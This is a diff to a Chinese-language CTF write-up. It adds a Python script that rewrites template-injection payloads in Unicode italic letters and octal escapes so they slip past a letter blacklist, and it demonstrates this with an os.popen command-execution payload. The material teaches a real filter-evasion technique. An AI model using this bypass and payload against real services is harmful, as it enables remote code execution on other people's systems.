@@ -567,4 +567,58 @@ BLACKLIST = ["b","c","d","e","h","i","j","k","m","n","o","p","q","r","s","t","u"
 看到exec是支持斜体字的；所以我们可以根据这个绕过所有字母的限制(这很变态了)。
 但是有一个限制就是如果题目直接渲染我们的输入的话，都需要经过URL编码，而斜体字的URL编码一般都会有两个编码值，比如`ª`就是`%c2%aa`，但是模板解析的时候会一个编码对应一个字符，所以就用不了，只有`ª (U+00AA)，º (U+00BA)`可以通过去掉前面的`%c2`,使用`%aa,%ba`代替
 但是如果可以像这道题一样文件上传并且并且直接渲染，那就很无敌了，任何字符限制都可以绕过。
-这里给一个利用的脚本
+这里给一个利用的脚本，会自动把payload转换为斜体字，并且把字符串的内容替换为：
+```python
+def generate_ultimate_bypass(payload):
+    normal = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+    italic = "𝑎𝑏𝑐𝑑𝑒𝑓𝑔ℎ𝑖𝑗𝑘𝑙𝑚𝑛𝑜𝑝𝑞𝑟𝑠𝑡𝑢𝑣𝑤𝑥𝑦𝑧𝐴𝐵𝐶𝐷𝐸𝐹𝐺𝐻𝐼𝐽𝐾𝐿𝑀𝑁𝑂𝑃𝑄𝑅𝑆𝑇𝑈𝑉𝑊𝑋𝑌𝑍"
+    trans_table = str.maketrans(normal, italic)
+
+    result = []
+    in_string = False
+    quote = ""
+
+    for ch in payload:
+        # 检测引号切换字符串状态
+        if ch in ("'", '"'):
+            if not in_string:
+                in_string = True
+                quote = ch
+                result.append(ch)
+            elif ch == quote:
+                in_string = False
+                result.append(ch)
+            else:
+                # 字符串内遇到不同引号：转八进制避免破坏字符串
+                result.append(f"\\{oct(ord(ch))[2:]}")
+            continue
+
+        # 字符串内部 → 八进制转义
+        if in_string:
+            result.append(f"\\{oct(ord(ch))[2:]}")
+            continue
+
+        # 代码部分 → 字母转斜体
+        if ch in normal:
+            result.append(ch.translate(trans_table))
+        else:
+            result.append(ch)
+
+    return "".join(result)
+
+# 测试执行
+raw_payload = "{{__import__('os').popen('ls').read()}}"
+print("[+] 原始:", raw_payload)
+print("="*110)
+out = generate_ultimate_bypass(raw_payload)
+print("[+] 生成:", out)
+print("="*110)
+# 简单验证：黑名单检查
+blacklist = set("abcdefghijklmnopqrstuvwxyz%<>,;?:")
+
+if any(c in blacklist for c in out):
+    print("[!] 检测：失败，仍包含黑名单字符")
+else:
+    print("[+] 检测：成功，无黑名单字符")
+
+```
